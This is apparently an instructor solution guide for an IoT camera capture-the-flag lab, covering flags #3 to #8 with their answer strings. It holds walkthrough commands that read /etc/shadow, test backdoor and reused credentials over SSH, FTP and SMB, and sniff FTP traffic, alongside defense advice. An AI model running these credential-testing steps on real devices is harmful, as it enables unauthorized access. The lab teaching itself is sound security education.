# Network configuration attempts
cat /var/log/messages | awk '/network|eth0|wlan0/ {print}'

# Authentication attempts
cat /var/log/messages | awk '/auth|login|ssh|password/ {print}'

# Service crashes or errors
cat /var/log/messages | awk '/error|fail|crash|panic/ {print}'

# Configuration changes
cat /var/log/messages | awk '/config|conf|setting/ {print}'
```

**Real-World IoT Logging Patterns**:
- Ring buffer logging (oldest entries overwritten)
- RAM-based logs (non-persistent across reboots)
- Minimal logging to conserve flash write cycles
- Debug logs left in production builds
- Credentials in clear text during service startup

**Extended Analysis**:

**BusyBox syslog**:
- Lightweight logging daemon
- Circular buffer in RAM
- `logread` command for real-time viewing
- Limited log size (typically 16-64 KB)

**Kernel Messages**:
```bash
# View kernel ring buffer
dmesg | head -50
# May contain hardware initialization, driver loading, device IDs
```

**Common Student Mistakes**:
- Only checking /var/log/messages, missing other log files
- Not checking dmesg for kernel messages
- Not using logread for BusyBox syslog
- Overlooking timestamps (may reveal system uptime)

---

### Flag #3: Web Interface HTML Source

**Location**: `http://192.168.1.132/index.html` (HTML source code)  
**Flag**: `FLAG{LEGOLAS83926471}`  
**OWASP Category**: IoT-03 (Insecure Ecosystem Interfaces)

**Teaching Methodology**:

**Concept**: IoT web interfaces often contain sensitive information in HTML comments or JavaScript.

**Why This Occurs**:
- Developers leave debugging information in production code
- Comments used for internal documentation
- API endpoints and tokens in client-side code
- Assumption that source code isn't examined
- Minimal code review in embedded development

**Real-World Context**: In professional IoT pentests, web interface source code frequently reveals:
- API endpoints and parameters
- Authentication tokens
- Default credentials
- Internal IP addresses
- Development/staging servers
- Version information

**Discovery Process**:

```bash
# Step 1: Browse to web interface
firefox http://192.168.1.132

# Step 2: View page source
# Right-click -> View Page Source
# Or: Ctrl+U

# Step 3: Download source for analysis
curl http://192.168.1.132/index.html -o index.html

# Step 4: Read source code systematically
cat index.html
```

**Expected Output** (relevant section):
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AXIS M1025 Network Camera</title>
    <link rel="stylesheet" href="/css/styles.css">
</head>
<body>
    <div class="header">
        <img src="/images/axis-logo.png" alt="AXIS Communications">
        <h1>AXIS M1025 Network Camera</h1>
    </div>
    
    <!-- Development build: v10.5.0-dev -->
    <!-- Debug token: FLAG{LEGOLAS83926471} -->
    <!-- Remove before production release -->
    
    <div class="login-form">
        <h2>Device Login</h2>
        <form action="/cgi-bin/login.cgi" method="POST">
            <input type="text" name="username" placeholder="Username">
            <input type="password" name="password" placeholder="Password">
            <button type="submit">Login</button>
        </form>
    </div>
    
    <script src="/js/api.js"></script>
</body>
</html>
```

**Instructor Analysis Discussion**:

**HTML Comment Analysis**:
```html
<!-- Development build: v10.5.0-dev -->
```
- Indicates this is a development version
- Should not be in production
- Dev builds often have debug features enabled

```html
<!-- Debug token: FLAG{LEGOLAS83926471} -->
```
- Debug authentication token
- Bypasses normal authentication
- Common in IoT development

```html
<!-- Remove before production release -->
```
- Clear indication this was left accidentally
- Common in rushed IoT deployments

**Additional Information Revealed**:

**Form Action Analysis**:
```html
<form action="/cgi-bin/login.cgi" method="POST">
```
- CGI script location: /cgi-bin/login.cgi
- Uses POST method
- Parameters: username, password
- Potential command injection target

**Resource Paths**:
```html
<link rel="stylesheet" href="/css/styles.css">
<script src="/js/api.js"></script>
```
- Directory structure revealed
- Additional files to examine
- JavaScript may contain API calls

**Extended Investigation**:

```bash
# Step 5: Examine JavaScript files
curl http://192.168.1.132/js/api.js -o api.js
cat api.js
```

**Common Findings in JavaScript**:
- API endpoints and parameters
- Authentication tokens in code
- Internal function calls
- Error messages with paths
- Development server URLs

**Teaching Exercise**: Have students examine all linked resources:

```bash
# Download and analyze all resources
wget -r -l 2 http://192.168.1.132
cd 192.168.1.132
find . -name "*.js" -exec cat {} \;
find . -name "*.css" -exec cat {} \;
```

**Real-World IoT Web Interfaces**:

**Common Vulnerabilities**:
1. **HTML Comments**: Debug info, credentials, internal notes
2. **JavaScript**: API tokens, endpoints, logic flaws
3. **CSS**: Rarely sensitive, but check for data URIs
4. **Images**: Metadata may contain information
5. **Robots.txt**: Reveals hidden directories

**Professional Approach**:
```bash
# Comprehensive web application analysis
nikto -h http://192.168.1.132
gobuster dir -u http://192.168.1.132 -w /usr/share/wordlists/dirb/common.txt
dirb http://192.168.1.132
```

**Common Student Mistakes**:
- Not viewing source code (only browsing visually)
- Missing HTML comments
- Not following links to JavaScript/CSS
- Not checking for hidden form fields
- Overlooking metadata in resources

**Security Implications**:
- Debug tokens allow authentication bypass
- Exposed CGI paths enable targeted attacks
- Version information maps to known CVEs
- Internal comments reveal development process
- Resource paths aid in directory traversal attacks

---

### Flag #4: Recording Cache Metadata

**Location**: `/var/cache/recorder/metadata.json`  
**Flag**: `FLAG{GANDALF74628395}`  
**OWASP Category**: IoT-06 (Insufficient Privacy Protection)

**Teaching Methodology**:

**Concept**: IoT cameras store recording metadata that may contain sensitive information beyond just video data.

**Real-World Context**: Camera recording systems maintain metadata for:
- Video indexing and search
- Event correlation
- Analytics processing
- Storage management
- Legal compliance (GDPR, surveillance laws)

**Why This Matters**:
- Metadata reveals what camera recorded even without video access
- Contains timestamps, locations, detection events
- May include personally identifiable information
- Often overlooked in security assessments
- Can be as sensitive as the video itself

**Discovery Process**:

```bash
# Step 1: Understand recording storage structure
ssh root@192.168.1.132
ls -la /var/cache/recorder/

# Step 2: Identify metadata files
find /var/cache/recorder -type f 2>/dev/null
```

**Expected Output**:
```
/var/cache/recorder/metadata.json
/var/cache/recorder/recording_001.mp4
/var/cache/recorder/recording_002.mp4
/var/cache/recorder/analytics.log
/var/cache/recorder/events.db
```

**Step 3: Read metadata file**:

```bash
cat /var/cache/recorder/metadata.json
```

**Expected Output**:
```json
{
  "camera": {
    "model": "AXIS M1025",
    "serial": "ACCC8E123456",
    "firmware": "10.5.0",
    "installation_id": "FLAG{GANDALF74628395}"
  },
  "recordings": [
    {
      "id": 1,
      "start_time": "2024-01-15T14:30:00Z",
      "end_time": "2024-01-15T14:45:00Z",
      "duration": 900,
      "file": "recording_001.mp4",
      "resolution": "1920x1080",
      "codec": "H.264",
      "events": [
        {
          "type": "motion_detection",
          "timestamp": "2024-01-15T14:32:15Z",
          "confidence": 0.95,
          "zone": "entrance"
        },
        {
          "type": "person_detected",
          "timestamp": "2024-01-15T14:32:18Z",
          "confidence": 0.87,
          "metadata": {
            "height_cm": 175,
            "direction": "entering"
          }
        }
      ]
    },
    {
      "id": 2,
      "start_time": "2024-01-15T18:20:00Z",
      "end_time": "2024-01-15T18:35:00Z",
      "duration": 900,
      "file": "recording_002.mp4",
      "events": [
        {
          "type": "vehicle_detected",
          "timestamp": "2024-01-15T18:22:30Z",
          "license_plate": "ABC-123",
          "vehicle_type": "sedan"
        }
      ]
    }
  ],
  "analytics": {
    "people_count_today": 45,
    "vehicle_count_today": 12,
    "motion_events_today": 203
  },
  "storage": {
    "total_space_mb": 500,
    "used_space_mb": 350,
    "recordings_count": 2,
    "retention_days": 7
  }
}
```

**Instructor Analysis Discussion**:

**Metadata Structure Analysis**:

**Camera Identification Section**:
```json
"camera": {
    "model": "AXIS M1025",
    "serial": "ACCC8E123456",
    "firmware": "10.5.0",
    "installation_id": "FLAG{GANDALF74628395}"
}
```

**Teaching Points**:
- Installation ID uniquely identifies deployment location
- Serial number identifies specific device
- Model and firmware map to vulnerabilities
- This information valuable for targeted attacks

**Recording Metadata**:
```json
"recordings": [
    {
      "id": 1,
      "start_time": "2024-01-15T14:30:00Z",
      "end_time": "2024-01-15T14:45:00Z",
      "duration": 900,
      "file": "recording_001.mp4"
    }
]
```

**Privacy Implications**:
- Timestamps reveal when premises were occupied
- Duration shows length of activities
- File references allow video correlation
- Pattern analysis reveals schedules

**Event Detection Data**:
```json
"events": [
    {
      "type": "person_detected",
      "timestamp": "2024-01-15T14:32:18Z",
      "confidence": 0.87,
      "metadata": {
        "height_cm": 175,
        "direction": "entering"
      }
    }
]
```

**Critical Privacy Issues**:
- Person detection with physical characteristics
- Direction of travel
- Timestamps of individual movements
- Confidence scores show AI analytics
- Can identify individuals without video

**Vehicle Detection**:
```json
{
  "type": "vehicle_detected",
  "timestamp": "2024-01-15T18:22:30Z",
  "license_plate": "ABC-123",
  "vehicle_type": "sedan"
}
```

**Legal Implications**:
- License plate recognition data
- May require special legal authorization
- GDPR compliance issues in EU
- Retention policies apply
- Access logs required

**Analytics Summary**:
```json
"analytics": {
    "people_count_today": 45,
    "vehicle_count_today": 12,
    "motion_events_today": 203
}
```

**Intelligence Value**:
- Daily patterns reveal business hours
- People counting shows foot traffic
- Vehicle counting for parking/delivery patterns
- Motion events show activity levels

**Real-World Exploitation Scenarios**:

**Reconnaissance**:
- Determine building occupancy patterns
- Identify high-traffic times
- Plan physical intrusions
- Social engineering preparation

**Privacy Violations**:
- Track individual movements
- Identify regular visitors
- Correlate with other data sources
- Build activity profiles

**Extended Analysis**:

```bash
# Check for additional metadata files
find /var/cache/recorder -name "*.json" -o -name "*.xml" -o -name "*.log" 2>/dev/null

# Examine analytics logs
cat /var/cache/recorder/analytics.log

# Check events database
file /var/cache/recorder/events.db
strings /var/cache/recorder/events.db
```

**Teaching Exercise**: Have students analyze the metadata to answer:
1. What times is the building most active?
2. What types of events are monitored?
3. What personally identifiable information is captured?
4. How long is data retained?
5. What legal compliance issues exist?

**Common Student Mistakes**:
- Focusing only on video files, ignoring metadata
- Not understanding JSON structure
- Missing privacy implications
- Not correlating metadata with other findings
- Overlooking analytics aggregation

**Security and Privacy Recommendations**:

**Data Minimization**:
- Only collect necessary metadata
- Disable analytics if not required
- Reduce retention periods
- Anonymize where possible

**Access Controls**:
- Encrypt metadata at rest
- Restrict metadata access separately from video
- Audit metadata queries
- Implement role-based access

**Compliance**:
- Document what metadata is collected
- Implement retention policies
- Provide data deletion mechanisms
- Maintain access logs

---

### Flag #5: Factory Configuration Backup

**Location**: `/mnt/flash/factory_config.xml`  
**Flag**: `FLAG{SAM38471925}`  
**OWASP Category**: IoT-09 (Insecure Default Settings)

**Teaching Methodology**:

**Concept**: Factory configuration files contain default settings and credentials that persist across resets.

**Real-World Context**: Factory configurations in IoT devices:
- Restore device to default state
- Contain manufacturing parameters
- Include default credentials
- Store calibration data
- Provide recovery mechanism

**Why This Matters**:
- Factory configs often accessible without authentication
- Reveal default credentials even if changed
- Show intended vs. actual configuration
- May contain vendor backdoors
- Provide attack path after factory reset

**Discovery Process**:

```bash
# Step 1: Explore flash storage
ssh root@192.168.1.132
ls -la /mnt/flash/

# Step 2: Look for configuration files
find /mnt/flash -name "*.xml" -o -name "*.conf" -o -name "*config*" 2>/dev/null
```

**Expected Output**:
```
/mnt/flash/factory_config.xml
/mnt/flash/current_config.xml
/mnt/flash/backup_config.xml
/mnt/flash/boot_config.txt
```

**Step 3: Read factory configuration**:

```bash
cat /mnt/flash/factory_config.xml
```

**Expected Output**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<AxisConfiguration version="1.0">
    <System>
        <DeviceInfo>
            <Model>AXIS M1025</Model>
            <SerialNumber>ACCC8E123456</SerialNumber>
            <FirmwareVersion>10.5.0</FirmwareVersion>
            <ManufactureDate>2024-01-01</ManufactureDate>
            <FactoryID>FLAG{SAM38471925}</FactoryID>
        </DeviceInfo>
        
        <DefaultCredentials>
            <User>root</User>
            <Password>pass</Password>
            <AdminUser>admin</AdminUser>
            <AdminPassword>admin123</AdminPassword>
        </DefaultCredentials>
        
        <Network>
            <DHCP>enabled</DHCP>
            <DefaultIP>192.168.0.90</DefaultIP>
            <DefaultGateway>192.168.0.1</DefaultGateway>
            <DefaultDNS>8.8.8.8</DefaultDNS>
        </Network>
        
        <Services>
            <SSH enabled="true" port="22"/>
            <HTTP enabled="true" port="80"/>
            <HTTPS enabled="false" port="443"/>
            <RTSP enabled="true" port="554"/>
            <UPnP enabled="true"/>
            <SNMP enabled="true" community="public"/>
        </Services>
        
        <Backdoor>
            <MaintenanceUser>axis_support</MaintenanceUser>
            <MaintenancePassword>Ax1s_M41nt_2024!</MaintenancePassword>
            <Purpose>Factory testing and RMA support</Purpose>
        </Backdoor>
        
        <Security>
            <SecureBoot>disabled</SecureBoot>
            <EncryptionKey>DEFAULT_KEY_DO_NOT_USE_IN_PROD</EncryptionKey>
            <UpdateSignature>disabled</UpdateSignature>
        </Security>
        
        <Calibration>
            <LensDistortion>0.003</LensDistortion>
            <FocalLength>4.2mm</FocalLength>
            <SensorOffset X="0" Y="0"/>
        </Calibration>
    </System>
</AxisConfiguration>
```

**Instructor Analysis Discussion**:

**Critical Security Issues Identified**:

**Default Credentials Section**:
```xml
<DefaultCredentials>
    <User>root</User>
    <Password>pass</Password>
    <AdminUser>admin</AdminUser>
    <AdminPassword>admin123</AdminPassword>
</DefaultCredentials>
```

**Teaching Points**:
- Even if admin changes password, factory config reveals defaults
- Multiple account types (root, admin) with different privileges
- Weak passwords (dictionary words, predictable patterns)
- Credentials in plaintext
- No warning about changing defaults

**Maintenance Backdoor**:
```xml
<Backdoor>
    <MaintenanceUser>axis_support</MaintenanceUser>
    <MaintenancePassword>Ax1s_M41nt_2024!</MaintenancePassword>
    <Purpose>Factory testing and RMA support</Purpose>
</Backdoor>
```

**Critical Issues**:
- Hidden maintenance account
- Strong password but hard-coded
- Same password across all devices
- "Purpose" field shows it's intentional
- RMA (Return Merchandise Authorization) support access

**Real-World Impact**:
- Vendor support backdoors common in IoT
- May survive firmware updates
- Difficult to disable
- Creates permanent vulnerability
- Legal/ethical implications of disclosure

**Network Default Configuration**:
```xml
<Network>
    <DHCP>enabled</DHCP>
    <DefaultIP>192.168.0.90</DefaultIP>
    <DefaultGateway>192.168.0.1</DefaultGateway>
    <DefaultDNS>8.8.8.8</DefaultDNS>
</Network>
```

**Security Implications**:
- Predictable default IP (scanning target)
- Public DNS (8.8.8.8 reveals traffic)
- Standard gateway (network reconnaissance)
- DHCP may expose to network attacks

**Service Configuration**:
```xml
<Services>
    <SSH enabled="true" port="22"/>
    <HTTP enabled="true" port="80"/>
    <HTTPS enabled="false" port="443"/>
    <RTSP enabled="true" port="554"/>
    <UPnP enabled="true"/>
    <SNMP enabled="true" community="public"/>
</Services>
```

**Attack Surface Analysis**:
- HTTPS disabled by default (no encryption)
- UPnP enabled (information disclosure, attacks)
- SNMP with "public" community string
- Multiple services increase attack vectors
- No service authentication mentioned

**Security Configuration**:
```xml
<Security>
    <SecureBoot>disabled</SecureBoot>
    <EncryptionKey>DEFAULT_KEY_DO_NOT_USE_IN_PROD</EncryptionKey>
    <UpdateSignature>disabled</UpdateSignature>
</Security>
```

**Critical Vulnerabilities**:
- Secure boot disabled (firmware modification possible)
- Default encryption key (all devices use same key)
- Warning in key value ("DO_NOT_USE_IN_PROD")
- Update signature disabled (unsigned firmware accepted)
- Complete security system disabled

**Extended Analysis**:

```bash
# Compare factory config to current config
diff /mnt/flash/factory_config.xml /mnt/flash/current_config.xml

# Check if backdoor account exists
cat /etc/passwd | awk -F: '$1 == "axis_support" {print}'
cat /etc/shadow | awk -F: '$1 == "axis_support" {print}'

# Test backdoor credentials
ssh axis_support@192.168.1.132
# Password: Ax1s_M41nt_2024!

# Check SNMP with default community string
snmpwalk -v2c -c public 192.168.1.132
```

**Teaching Exercise**: Have students answer:
1. What accounts exist by default?
2. Which security features are disabled?
3. What services are exposed?
4. How would you verify the backdoor exists?
5. What's the impact of disabled secure boot?

**Real-World Factory Reset Attacks**:

**Attack Scenario 1: Physical Access**:
1. Attacker gains physical access to device
2. Performs factory reset
3. Logs in with default credentials from factory config
4. Regains full control

**Attack Scenario 2: Remote Exploitation**:
1. Discover factory config through vulnerability
2. Learn maintenance backdoor credentials
3. Access same credentials on other devices
4. Compromise entire deployment

**Common Student Mistakes**:
- Not comparing factory vs. current configuration
- Missing the significance of backdoor accounts
- Not testing discovered credentials
- Overlooking disabled security features
- Not checking if accounts actually exist

**Defense Recommendations**:

**Immediate Actions**:
- Remove or disable backdoor accounts
- Change all default credentials
- Enable secure boot
- Enable update signature verification
- Disable unnecessary services

**Configuration Hardening**:
- Encrypt factory configuration files
- Remove default credentials from factory config
- Implement first-boot password change requirement
- Use unique per-device encryption keys
- Enable HTTPS and disable HTTP

**Development Practices**:
- Never hard-code credentials
- Remove debug features before production
- Enable security features by default
- Implement secure manufacturing process
- Regular security audits of factory configs

---

## Medium Flags

**Teaching Approach for Medium Flags**: These challenges require deeper system understanding, multi-step exploitation, and recognition of encoded vs. encrypted data. Students must combine multiple techniques and think about how IoT systems differ from traditional environments.

### Flag #6: Persistent Storage Backup Script

**Location**: `/var/lib/persistent/backup_script.sh`  
**Flag**: `FLAG{MERRY92857361}`  
**OWASP Category**: IoT-08 (Lack of Device Management)

**Teaching Methodology**:

**Concept**: Persistent storage in IoT devices contains scripts and data that survive reboots, often including sensitive information.

**Real-World Context**: IoT devices use persistent storage for:
- Custom user scripts
- Automated backup processes
- Configuration management
- Data retention
- Device customization

**Why Scripts Contain Secrets**:
- Automation requires credentials
- API integrations need tokens
- Backup destinations need authentication
- Developers hard-code for convenience
- Scripts run unattended

**Discovery Process**:

```bash
# Step 1: Explore persistent storage
ssh root@192.168.1.132
ls -laR /var/lib/persistent/

# Step 2: Identify scripts
find /var/lib/persistent -name "*.sh" -o -name "*.py" -o -name "*.pl" 2>/dev/null
```

**Expected Output**:
```
/var/lib/persistent/backup_script.sh
/var/lib/persistent/maintenance.sh
/var/lib/persistent/update_check.sh
/var/lib/persistent/logs/backup.log
```

**Step 3: Read the backup script**:

```bash
cat /var/lib/persistent/backup_script.sh
```

**Expected Output**:
```bash
#!/bin/sh
# Automated Backup Script for AXIS Camera
# Runs daily via cron at 2:00 AM

# Configuration
BACKUP_SERVER="192.168.1.100"
BACKUP_USER="backup"
BACKUP_PASS="BackupP@ss2024"
BACKUP_PATH="/backups/axis_cameras"
DEVICE_ID="FLAG{MERRY92857361}"

# Backup directories
BACKUP_DIRS="/var/lib/persistent /mnt/flash/config /var/cache/recorder"

# Create timestamp
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BACKUP_FILE="axis_backup_${DEVICE_ID}_${TIMESTAMP}.tar.gz"

# Log function
log() {
    echo "[$(date)] $1" >> /var/lib/persistent/logs/backup.log
}

log "Starting backup process"

# Create backup archive
tar -czf /tmp/${BACKUP_FILE} ${BACKUP_DIRS} 2>/dev/null

if [ $? -eq 0 ]; then
    log "Backup archive created successfully"
else
    log "ERROR: Failed to create backup archive"
    exit 1
fi

# Transfer to backup server via FTP
log "Transferring backup to server ${BACKUP_SERVER}"

ftp -n ${BACKUP_SERVER} <<EOF
user ${BACKUP_USER} ${BACKUP_PASS}
binary
cd ${BACKUP_PATH}
put /tmp/${BACKUP_FILE}
quit
EOF

if [ $? -eq 0 ]; then
    log "Backup transferred successfully"
    rm /tmp/${BACKUP_FILE}
    log "Temporary backup file removed"
else
    log "ERROR: Failed to transfer backup"
fi

log "Backup process completed"
```

**Instructor Analysis Discussion**:

**Credential Exposure**:
```bash
BACKUP_USER="backup"
BACKUP_PASS="BackupP@ss2024"
```

**Teaching Points**:
- Clear text credentials in script
- Credentials reused across devices
- FTP credentials (unencrypted protocol)
- Potential domain credentials
- Network infrastructure access

**Device Identification**:
```bash
DEVICE_ID="FLAG{MERRY92857361}"
```

**Purpose Analysis**:
- Uniquely identifies device in backup system
- Allows correlation of backups to devices
- May be used in centralized management
- Tracking and asset management

**Infrastructure Information**:
```bash
BACKUP_SERVER="192.168.1.100"
BACKUP_PATH="/backups/axis_cameras"
```

**Intelligence Gathering**:
- Internal network IP address revealed
- Backup server location
- Directory structure on backup server
- Naming conventions
- Infrastructure mapping

**Backup Contents**:
```bash
BACKUP_DIRS="/var/lib/persistent /mnt/flash/config /var/cache/recorder"
```

**Data Exposure Risk**:
- Persistent storage (all custom configurations)
- Flash configuration (credentials, network config)
- Recorder cache (video and metadata)
- Complete device state backed up
- Historical data accessible

**FTP Protocol Usage**:
```bash
ftp -n ${BACKUP_SERVER} <<EOF
user ${BACKUP_USER} ${BACKUP_PASS}
```

**Protocol Weakness**:
- FTP sends credentials in plain text
- No encryption of data in transit
- Susceptible to MITM attacks
- Network sniffing reveals credentials
- Legacy protocol with known weaknesses

**Real-World Exploitation Scenarios**:

**Scenario 1: Backup Server Compromise**:
1. Use discovered FTP credentials
2. Connect to backup server (192.168.1.100)
3. Access /backups/axis_cameras directory
4. Download all camera backups
5. Extract sensitive data from multiple devices

**Practical Steps**:
```bash
# Test FTP credentials
ftp 192.168.1.100
# Username: backup
# Password: BackupP@ss2024

# List backups
cd /backups/axis_cameras
ls -la

# Download recent backups
mget axis_backup_*.tar.gz

# Extract and analyze
tar -xzf axis_backup_MERRY92857361_20240115_020000.tar.gz
find . -name "*.conf" | while read file; do cat "$file"; done
```

**Scenario 2: Network Traffic Analysis**:
```bash
# Capture FTP traffic
tcpdump -i eth0 -w ftp_capture.pcap host 192.168.1.100 and port 21

# Analyze captured traffic
wireshark ftp_capture.pcap
# Filter: ftp
# Look for USER and PASS commands in plain text
```

**Scenario 3: Credential Reuse**:
```bash
# Test credentials on other services
ssh backup@192.168.1.100
# Password: BackupP@ss2024

# Check for Windows shares
smbclient -L 192.168.1.100 -U backup
# Password: BackupP@ss2024

# Try web interfaces
curl http://192.168.1.100 -u backup:BackupP@ss2024
```

**Extended Analysis**:

```bash
# Check when backup script runs
cat /etc/crontabs/root | awk '/backup/ {print}'

# Review backup logs
cat /var/lib/persistent/logs/backup.log

# Identify what gets backed up
for dir in /var/lib/persistent /mnt/flash/config /var/cache/recorder; do
    echo "=== $dir ==="
    find $dir -type f 2>/dev/null
done
```

**Teaching Exercise**: Have students:
1. Map the complete backup process
2. Identify all credentials exposed
3. Determine backup server access
4. Assess data sensitivity in backups
5. Propose secure alternatives

**Common Student Mistakes**:
- Only noting the flag, missing credentials
- Not testing discovered credentials
- Ignoring backup server as attack target
- Not considering backup data contents
- Missing FTP protocol vulnerabilities

**Security Best Practices Discussion**:

**Credential Management**:
- Never hard-code credentials in scripts
- Use environment variables or secure vaults
- Implement key-based authentication
- Rotate credentials regularly
- Use unique passwords per device

**Secure Backup Solutions**:
- Use encrypted protocols (SFTP, SCP, HTTPS)
- Encrypt backup archives
- Implement access controls on backup server
- Log all backup operations
- Verify backup integrity

**Script Security**:
- Restrict script permissions (chmod 700)
- Store scripts in protected locations
- Audit scripts regularly
- Remove debug information
- Implement logging and monitoring

---

### Flag #7: ROT13 Encoded Credentials

**Location**: `/var/lib/persistent/encoded_creds.txt`  
**Flag**: `FLAG{PIPPIN64738291}`  
**OWASP Category**: IoT-05 (Use of Insecure or Outdated Components)

**Teaching Methodology**:

**Concept**: ROT13 is a substitution cipher that shifts letters 13 positions. It provides no security but is sometimes used by developers who confuse encoding with encryption.

**Critical Teaching Point**: Understanding the difference between encoding, obfuscation, and encryption is fundamental to IoT security assessment.

**Encoding vs. Obfuscation vs. Encryption**:

**Encoding** (Base64, Hex, URL encoding):
- Purpose: Data representation
- Reversible without key
- No security benefit
- Anyone can decode
- Examples: Base64, ASCII hex

**Obfuscation** (ROT13, XOR with known key):
- Purpose: Make data unclear
- Easily reversible
- Minimal security benefit
- "Security through obscurity"
- Examples: ROT13, Caesar cipher

**Encryption** (AES, RSA):
- Purpose: Confidentiality
- Requires secret key
- Computationally hard to reverse
- Proper security benefit
- Examples: AES-256, RSA-2048

**Real-World Context**: ROT13 appears in IoT devices because:
- Developers lack security training
- Belief that "obscurity = security"
- Quick implementation
- No library dependencies
- Works in resource-constrained environments

**Discovery Process**:

```bash
# Step 1: Find encoded credential files
ssh root@192.168.1.132
find /var/lib/persistent -name "*cred*" -o -name "*pass*" -o -name "*auth*" 2>/dev/null
```

**Expected Output**:
```
/var/lib/persistent/encoded_creds.txt
/var/lib/persistent/credentials_backup.txt
```

**Step 2: Read the file**:

```bash
cat /var/lib/persistent/encoded_creds.txt
```

**Expected Output**:
```
# Encoded Service Credentials
# Format: service:username:encoded_password

ftp_backup:backup:OnpxhcC@ff2024
api_service:api_user:NcvXrl2024FrpherGbxra!
database:db_admin:QoNqzva@cc123
device_id:axis_m1025:SYNT{CVCCVA64738291}
maintenance:support:Maint3nance_Axif_2024
```

**Step 3: Recognize ROT13 pattern**:

**Instructor Teaching Moment**: Have students examine the encoded strings before providing the solution.

**Recognition Patterns**:
- Looks like garbled English
- Contains special characters that didn't shift (@ ! _ -)
- Numbers remain unchanged
- Letter frequency similar to English
- Some words partially recognizable

**Example Analysis**:
```
OnpxhcC@ff2024
^
Notice: Starts with capital letter (likely encoded from 'B')
Contains '@' (didn't change, not a letter)
Numbers '2024' unchanged
Pattern suggests ROT13
```

**Step 4: Decode ROT13**:

**Manual Understanding** (before using tools):
```
ROT13 Algorithm:
- A-M becomes N-Z
- N-Z becomes A-M
- a-m becomes n-z  
- n-z becomes a-m
- Non-letters unchanged

Example:
O -> B (O is 15th letter, -13 = B, 2nd letter)
n -> a (n is 14th letter, -13 = a, 1st letter)
p -> c (p is 16th letter, -13 = c, 3rd letter)
```

**Using Command Line**:
```bash
# Method 1: tr command (translate characters)
cat /var/lib/persistent/encoded_creds.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Method 2: For single line
echo "SYNT{CVCCVA64738291}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**Decoded Output**:
```
# Encoded Service Credentials
# Format: service:username:encoded_password

ftp_backup:backup:BackupP@ss2024
api_service:api_user:ApiKey2024SecureToken!
database:db_admin:DbAdmin@pp123
device_id:axis_m1025:FLAG{PIPPIN64738291}
maintenance:support:Maint3nance_Axis_2024
```

**Instructor Analysis Discussion**:

**Credential Analysis**:

**FTP Backup Credentials** (correlates with Flag #6):
```
ftp_backup:backup:BackupP@ss2024
```
- Same password as backup script
- Confirms credential reuse across system
- Multiple attack vectors to same resource

**API Service Credentials**:
```
api_service:api_user:ApiKey2024SecureToken!
```
- API access token
- Format suggests it's treated as password
- May provide API access without normal authentication

**Database Credentials**:
```
database:db_admin:DbAdmin@pp123
```
- Database administrator account
- Weak password (dictionary word + predictable pattern)
- Full database access

**Maintenance Account**:
```
maintenance:support:Maint3nance_Axis_2024
```
- Support account credentials
- Predictable password pattern (year included)
- Likely same across multiple devices

**Real-World Exploitation**:

```bash
# Test API credentials
curl http://192.168.1.132/api/v1/ -H "Authorization: Bearer ApiKey2024SecureToken!"

# Test FTP access (correlates with backup script)
ftp 192.168.1.132
# Username: backup
# Password: BackupP@ss2024

# Check for database service
netstat -tulpn | awk '$4 ~ /:3306|:5432|:27017/ {print}'

# Test maintenance account
ssh support@192.168.1.132
# Password: Maint3nance_Axis_2024
```

**Extended Analysis**:

```bash
# Check for other encoded files
find /var /mnt/flash /usr/local -type f -exec file {} \; | awk 'tolower($0) ~ /text/ {print $1}' | sed 's/:$//' | while read file; do
    echo "=== $file ==="
    cat "$file" | head -5
done

# Look for other encoding patterns
find /var/lib/persistent -type f -exec sh -c 'cat "$1" | awk "/^[A-Za-z0-9+\/=]{20,}/ {print; exit}"' _ {} \; 2>/dev/null
```

**Teaching Exercise - Encoding Recognition**:

Present students with various encoded strings and have them identify the method:

```
1. VXNlcjpBZG1pbg==
   Answer: Base64 (ends with ==, uses Base64 alphabet)

2. Uryyb_Jbeyq
   Answer: ROT13 (looks like English, letters only transformed)

3. 48656c6c6f
   Answer: Hexadecimal (only 0-9, A-F)

4. %48%65%6c%6c%6f
   Answer: URL encoding (% followed by hex)

5. 01001000 01100101
   Answer: Binary (only 0 and 1)
```

**Decoding Practice**:

```bash
# Base64 decode
echo "VXNlcjpBZG1pbg==" | base64 -d
# Output: User:Admin

# ROT13 decode
echo "Uryyb_Jbeyq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Output: Hello_World

# Hex decode
echo "48656c6c6f" | xxd -r -p
# Output: Hello

# URL decode
python3 -c "import urllib.parse; print(urllib.parse.unquote('%48%65%6c%6c%6f'))"
# Output: Hello
```

**Common Student Mistakes**:
- Thinking ROT13 provides actual security
- Not recognizing encoded vs. encrypted data
- Only decoding the flag, missing other credentials
- Not testing decoded credentials
- Not looking for pattern of encoding across system

**Security Implications Discussion**:

**Why Developers Use ROT13**:
- Quick implementation (no libraries needed)
- Prevents casual viewing
- Survives basic text searches
- No key management complexity
- Misunderstanding of security

**Real Security Requirements**:
- Use proper encryption (AES-256)
- Implement key management
- Use hardware security modules for IoT
- Never store credentials in files
- Use secure credential vaults

**Defense Recommendations**:
- Replace encoding with encryption
- Use environment variables
- Implement secrets management
- Regular security audits
- Security training for developers

---

### Flag #8: Runtime Service Configuration

**Location**: `/run/axis/services.conf`  
**Flag**: `FLAG{BOROMIR53184726}`  
**OWASP Category**: IoT-02 (Insecure Network Services)

**Teaching Methodology**:

**Concept**: Runtime directories (/run, /var/run) contain current service state and temporary operational data.

**Why /run Is Important**:
- Contains current runtime state
- Process IDs and socket files
- Active service configuration
- Temporary credentials
- Session information
- May differ from persistent configuration

**Difference from Persistent Configuration**:

**Persistent Configuration** (/etc, /mnt/flash):
- Survives reboots
- Initial service settings
- User-modified values
- Backup and restore targets

**Runtime Configuration** (/run, /var/run):
- Temporary (cleared on reboot)
- Current operational state
- May include overrides
- Active session data
- Real-time service parameters

**Real-World Context**: Runtime directories often contain:
- Credentials passed between services
- Temporary authentication tokens
- Service startup parameters
- Debug information in production
- API keys for service integration

**Discovery Process**:

```bash
# Step 1: Understand /run directory
ssh root@192.168.1.132
ls -la /run/

# Step 2: Identify vendor-specific runtime data
ls -laR /run/axis/
```

**Expected Output**:
```
/run/axis/:
total 16
drwxr-xr-x    3 root     root           120 Jan 15 12:00 .
drwxr-xr-x   15 root     root           380 Jan 15 12:00 ..
